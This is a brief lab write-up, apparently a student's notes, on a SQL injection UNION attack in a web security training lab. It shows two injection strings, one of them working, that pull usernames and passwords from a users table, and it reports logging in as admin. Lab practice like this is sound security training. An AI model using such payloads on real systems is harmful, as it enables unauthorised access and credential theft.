## Lab: SQL injection UNION attack, retrieving multiple values in a single column ##

### Lab Description ###

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/8c6d1a4b-659e-4da3-a5b9-93024a45e230)

> We have retrieve username and passwords and login as admin account.

We tried inject the following query `' UNION SELECT username || '~' || password FROM users--` but it did'nt work

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/48a9f121-c6c6-4e06-b889-c53885722e50)

> Lets try some other query like ` 'UNION SELECT NULL,username || '~' || password FROM+users--` in this we are specifying another column called null in case if there is any null column is present or not.

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/d2776817-547e-4db6-b1b0-fb7424510ded)

> So when we send the above query we get the details of the users. Let's try login to admin.

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/c14d8af7-dcc8-4eed-9d50-caa38abf9b72)

> So we sucessfully loged in as admin.

